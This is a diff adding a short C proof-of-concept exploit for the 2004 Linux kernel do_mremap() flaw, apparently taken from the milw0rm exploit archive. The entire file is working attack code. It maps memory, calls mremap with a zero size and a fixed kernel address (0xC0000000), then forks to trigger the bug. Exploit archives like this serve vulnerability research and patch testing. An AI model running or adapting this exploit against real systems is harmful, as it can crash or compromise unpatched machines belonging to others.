@@ -1,0 +1,50 @@
+/*
+ *  Proof-of-concept exploit code for do_mremap()
+ *
+ *  Copyright (C) 2004  Christophe Devine and Julien Tinnes
+ *
+ *  This program is free software; you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation; either version 2 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ *
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program; if not, write to the Free Software
+ *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ */
+
+#include <asm/unistd.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <errno.h>
+
+#define MREMAP_MAYMOVE  1
+#define MREMAP_FIXED    2
+
+#define __NR_real_mremap __NR_mremap
+
+static inline _syscall5( void *, real_mremap, void *, old_address,
+                         size_t, old_size, size_t, new_size,
+                         unsigned long, flags, void *, new_address );
+
+int main( void )
+{
+    void *base;
+
+    base = mmap( NULL, 8192, PROT_READ | PROT_WRITE,
+                 MAP_PRIVATE | MAP_ANONYMOUS, 0, 0 );
+
+    real_mremap( base, 0, 0, MREMAP_MAYMOVE | MREMAP_FIXED,
+                 (void *) 0xC0000000 );
+
+    fork();
+
+    return( 0 );
+}
+
+// milw0rm.com [2004-01-06]
